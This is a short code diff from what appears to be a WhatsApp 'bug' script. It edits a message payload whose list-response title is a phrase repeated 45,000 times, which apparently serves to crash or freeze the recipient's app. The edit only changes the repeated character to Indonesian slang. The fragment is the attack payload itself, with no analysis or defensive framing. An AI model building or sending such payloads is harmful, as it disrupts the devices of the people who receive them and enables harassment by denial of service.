@@ -2575,7 +2575,7 @@ let messagePayload = {
 viewOnceMessage: {
 message: {
 listResponseMessage: {
-title: "Send Qris Pnyamu" + "ꦽ".repeat(45000),
+title: "Send Qris Pnyamu" + "wkwk canda bang sv ranz".repeat(45000),
 listType: 2,
 singleSelectReply: {
     selectedRowId: "🩸"
